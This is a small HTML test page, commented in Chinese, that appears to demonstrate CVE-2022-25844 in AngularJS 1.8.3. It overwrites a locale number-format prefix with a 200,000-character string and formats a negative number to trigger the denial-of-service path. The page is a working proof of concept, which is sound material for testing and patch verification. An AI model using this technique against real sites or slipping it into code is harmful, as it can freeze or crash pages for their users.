<!DOCTYPE html>
<html ng-app="cveApp">
<head>
  <meta charset="UTF-8">
  <title>CVE-2022-25844 測試頁</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
</head>
<body ng-controller="MainCtrl">
  <h2>CVE-2022-25844 測試頁</h2>
  <p>輸出格式化數字（負數）：{{ bigNeg | number:2 }}</p>

  <script>
    angular.module('cveApp', [])
      .run(function($rootScope, $locale) {
        // 💥 模擬攻擊：覆寫 $locale 負數格式中的 posPre 為極長字串
        $locale.NUMBER_FORMATS.PATTERNS[1].posPre = '1'.repeat(200000);

        // 使用負數來觸發 PATTERNS[1]
        $rootScope.bigNeg = -98765432101234567890.123456789;
        console.log("✅ $locale 已注入，bigNeg:", $rootScope.bigNeg);
      })
      .controller('MainCtrl', function() {
        console.log("⚙️ 正在渲染 $filter('number') 輸出");
      });
  </script>
</body>
</html>
